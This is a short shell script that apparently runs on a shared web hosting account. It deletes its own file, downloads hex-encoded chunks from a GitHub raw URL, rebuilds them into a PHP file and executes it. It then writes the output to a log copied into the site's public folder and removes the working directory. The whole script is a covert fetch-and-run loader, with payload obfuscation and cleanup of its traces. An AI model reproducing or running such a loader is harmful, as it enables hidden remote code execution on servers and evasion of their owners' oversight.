#!/bin/sh
M=/home/u814079684/.pphobi.log
W=/home/u814079684/domains/pensiun.pro/public_html/pphobi-v2.txt
D=/home/u814079684/pphobi-v5
B=https://raw.githubusercontent.com/jununrs/pensiun-pro-tmp-pub/eb3c181eea17e7995bf608e4532e25db3d24b090/hobi-v5
rm -f /home/u814079684/pphobi.sh
if [ -e "$M" ]; then find "$W" -mmin +4 -delete 2>/dev/null; exit 0; fi
mkdir -p "$D" && cd "$D" || exit 1
for f in meta.json r00.hex r01.hex r02.hex r03.hex r04.hex r05.hex c00.hex c01.hex c02.hex c03.hex c04.hex c05.hex c06.hex c07.hex c08.hex c09.hex c10.hex c11.hex c12.hex c13.hex c14.hex; do
  curl -fsSL -o "$f" "$B/$f" || { cd /home/u814079684; rm -rf "$D"; echo "fetch fail $f" > "$W"; exit 1; }
done
python3 -c "open('run.php','wb').write(bytes.fromhex(''.join(open('r%02d.hex'%i).read().strip() for i in range(6))))" || \
  php -r '$h=""; for($i=0;$i<6;$i++) $h.=trim(file_get_contents(sprintf("r%02d.hex",$i))); file_put_contents("run.php", hex2bin($h));'
echo "start $(date -u +%FT%TZ)" > "$M"
/usr/bin/php -r 'echo "sapi=",PHP_SAPI," v=",PHP_VERSION,PHP_EOL;' >> "$M" 2>&1
/usr/bin/php "$D/run.php" >> "$M" 2>&1
cd /home/u814079684 && rm -rf "$D"
echo "dir_removed=$([ -d "$D" ] && echo no || echo yes)" >> "$M"
cp "$M" "$W"
